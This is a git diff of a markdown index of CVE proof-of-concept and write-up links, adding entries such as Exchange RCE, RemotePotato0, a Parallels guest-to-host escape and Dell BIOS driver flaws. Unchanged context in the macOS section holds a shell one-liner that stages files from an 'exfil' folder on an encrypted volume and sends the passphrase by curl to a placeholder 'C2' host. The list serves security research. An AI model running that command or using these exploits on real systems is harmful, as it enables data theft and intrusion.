@@ -42,7 +42,7 @@ Some CVEs PoCs repos on github or internet.
 - [BlindSide](https://www.vusec.net/projects/blindside/)
 - Exploiting a Linux kernel vulnerability in the V4L2 subsystem: [CVE-2019-18683](https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html)
 - Heap-Based Buffer Overflow in Sudo: [CVE-2021-3156](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
-- Ubuntu OverlayFS Local Privesc: [CVE-2021-3493](https://github.com/briskets/CVE-2021-3493)
+- [Ubuntu OverlayFS Local Privesc](https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/): [CVE-2021-3493](https://github.com/briskets/CVE-2021-3493)
 
 ## Solaris
 
@@ -97,7 +97,9 @@ Some CVEs PoCs repos on github or internet.
 - ProxyLogon: [CVE-2021-26855](https://github.com/hausec/ProxyLogon) [another](https://web.archive.org/web/20210310164403/https://gist.github.com/testanull/fabd8eeb46f120c4b15f8793617ca7d1)
 - Zero-day vulnerability in Desktop Window Manager: [CVE-2021-28310](https://securelist.com/zero-day-vulnerability-in-desktop-window-manager-cve-2021-28310-used-in-the-wild/101898/)
 - Windows kernel zero-day exploi: [CVE-2021-1732](https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/)
-- Windows TCP/IP: [CVE-2021-24086](https://www.pwnwiki.org/index.php?title=CVE-2021-24086_Windows_TCP/IP%E6%8B%92%E7%B5%95%E6%9C%8D%E5%8B%99%E6%BC%8F%E6%B4%9E/es), [PoC](https://github.com/0vercl0k/CVE-2021-24086)
+- Windows TCP/IP: [CVE-2021-24086](https://www.pwnwiki.org/index.php?title=CVE-2021-24086_Windows_TCP/IP%E6%8B%92%E7%B5%95%E6%9C%8D%E5%8B%99%E6%BC%8F%E6%B4%9E/es), [PoC](https://github.com/0vercl0k/CVE-2021-24086) another write-up: [Reverse-engineering tcpip.sys: mechanics of a packet of the death (CVE-2021-24086)](https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/#bonus-cve-2021-24074)
+- Relaying Potatoes: Another Unexpected Privilege Escalation Vulnerability in Windows RPC Protocol, [CVE-2020-1113 and CVE-2021-1678](https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop/). [RemotePotato0](https://github.com/antonioCoco/RemotePotato0)
+- Microsoft Exchange Server Remote Code Execution Vulnerability: [CVE-2021-28482](https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda) [article](https://testbnull.medium.com/microsoft-exchange-from-deserialization-to-post-auth-rce-cve-2021-28482-e713001d915f)
 
 ## macOS/iOS
 
@@ -124,6 +126,7 @@ Some CVEs PoCs repos on github or internet.
   ```sh
   sh -c 'p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:alnum:]]" | head -n 64| tr -d "\n"); diskutil apfs addVolume disk1 APFS x -passphrase "$p"; rsync -zvh --remove-source-files ~/exfil/* /Volumes/x; diskutil umount x; curl -0 http://C2/"$p"'
   ```
+- [Don't Share Your $HOME with Untrusted Guests](https://zerodayengineering.com/blog/dont-share-your-home.html). [PoC](https://github.com/badd1e/Proof-of-Concept/tree/main/prl_not0day): This proof-of-concept demonstrates a trivial no-bug, by-design virtual machine guest-to-host escape with full arbitrary code execution on the current version of Parallels Desktop for Mac.
 
 ## Android
 
@@ -157,6 +160,7 @@ Some CVEs PoCs repos on github or internet.
 - Cyberus: [Meltdown](http://blog.cyberus-technology.de/posts/2018-01-03-meltdown.html)
 - L1 Terminal Fault: [CVE-2018-3615/CVE-2018-3620/CVE-2018-3646/INTEL-SA-00161](https://software.intel.com/security-software-guidance/software-guidance/l1-terminal-fault)
 - [TPM—Fail](http://tpm.fail/): TPM meets Timing and Lattice Attacks. [TPM-FAIL vulnerabilities impact TPM chips in desktops, laptops, servers](https://www.zdnet.com/article/tpm-fail-vulnerabilities-impact-tpm-chips-in-desktops-laptops-servers/), [github](https://github.com/VernamLab/TPM-Fail).
+- Hundreds Of Millions Of Dell Computers At Risk Due to Multiple BIOS Driver Privilege Escalation Flaws: [CVE-2021-21551](https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/)
 
 ### ARM
 
@@ -165,6 +169,7 @@ Some CVEs PoCs repos on github or internet.
 - [DoubleDoor](https://blog.newskysecurity.com/doubledoor-iot-botnet-bypasses-firewall-as-well-as-modem-security-using-two-backdoor-exploits-88457627306d), IoT Botnet bypasses firewall as well as modem security using two backdoor exploits: CVE-2015–7755 and CVE-2016–10401
 - [i.MX7 M4 Atomic Cache Bug](https://rschaefertech.wordpress.com/2018/02/17/imx7-hardware-bug/)
 - [MikroTik Firewall & NAT Bypass](https://medium.com/tenable-techblog/mikrotik-firewall-nat-bypass-b8d46398bf24)
+- Security probe of Qualcomm MSM data services [CVE-2020-11292](https://research.checkpoint.com/2021/security-probe-of-qualcomm-msm/) [news](https://www.bleepingcomputer.com/news/security/qualcomm-vulnerability-impacts-nearly-40-percent-of-all-mobile-phones/)
 
 ## VirtualBox
 
@@ -229,6 +234,7 @@ Some CVEs PoCs repos on github or internet.
   - [CVE-2019-13054](https://github.com/mame82/munifying-web): The page utilizes the new WebHID API to extract AES encryption keys from vulnerable dongles. [PoC Page](https://mame82.github.io/munifying-web/)
   - [chrome 0day](https://github.com/r4j0x00/exploits/tree/master/chrome-0day) [r4j0x00](https://twitter.com/r4j0x00/status/1381643526010597380)
   - ELECTRIC CHROME: [CVE-2020-6418](https://leethax0.rs/2021/04/ElectricChrome/) on Tesla Model 3.
+  - [Analysis of Chromium issue 1196683, 1195777](https://iamelli0t.github.io/2021/04/20/Chromium-Issue-1196683-1195777.html)
 - [Google Books X-Hacking](https://medium.com/@terjanq/google-books-x-hacking-29c249862f19)
 - Ruby on Rails: File Content Disclosure on Rails - [CVE-2019-5418](https://github.com/mpgn/CVE-2019-5418)
 - Libreoffice - Remote Code Execution via Macro/Event execution: [CVE-2018-16858](https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html)
